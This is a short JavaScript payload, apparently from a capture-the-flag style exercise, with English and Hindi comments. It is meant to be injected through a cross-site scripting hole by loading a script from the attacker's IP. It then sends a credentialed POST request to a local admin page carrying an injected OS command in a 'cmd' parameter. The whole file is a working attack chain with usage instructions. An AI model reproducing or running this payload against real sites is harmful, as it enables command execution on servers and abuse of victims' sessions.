// dont forget to change the url , remeber this payload must run on the webserver ,so localhost will not change,dont forget to change params, 

// you can run this on webserver by executing this script via any xxs vunerability: <script src=http://your_ip_on_which_you_run_httpserver/payload_webserver></script>

var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/index.php";
var params= "cmd=dir | ping -n 10.10.14,53";
xhr.open("POST",url);
xhr.setRequestHeader('Content-Type','Application/x-www-form-urlencoded'); // you can find this on burp intercepted request
xhr.withCredentials = true;  // is line se woh credentials jayenge jo ki webserver jisspar yein script run kr rahi hai,uss server par browser open krke cokkies ke credentials lega
xhr.send(params);
